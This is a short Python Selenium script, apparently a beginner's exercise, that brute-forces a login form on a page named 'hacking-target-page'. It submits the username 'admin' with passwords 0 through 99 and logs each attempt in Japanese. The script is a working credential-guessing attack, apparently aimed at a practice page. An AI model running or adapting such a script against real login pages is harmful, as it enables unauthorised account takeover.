from selenium import webdriver
from selenium.webdriver.common.by import By

import time
import traceback

driver = webdriver.Chrome()

driver.get('https://nneskyrinrin.bambina.jp/hacking-target-page/')

username = 'admin'

username_form_element = driver.find_element(By.ID, 'username')
password_form_element = driver.find_element(By.ID, 'password')
send_button_element = driver.find_element(By.ID, 'sendButton')


def input_username():
    
    username_form_element.send_keys(username)

# while True:

#     break

for i in range(0, 100): 
    try:
        input_username()
        password_form_element.send_keys(i)
        send_button_element.click()
        print(f'入力した文字列: username: "{username}" password: "{i}"')
    except Exception:
        # print(f'成功した組み合わせ username: "{username}" password: "{i}"')
        traceback.print_exc()
        # break

    


# username_form_element.send_keys('admin')
# password_form_element.send_keys('0')
# send_button_element.click()

time.sleep(5)

driver.quit()


# input_username()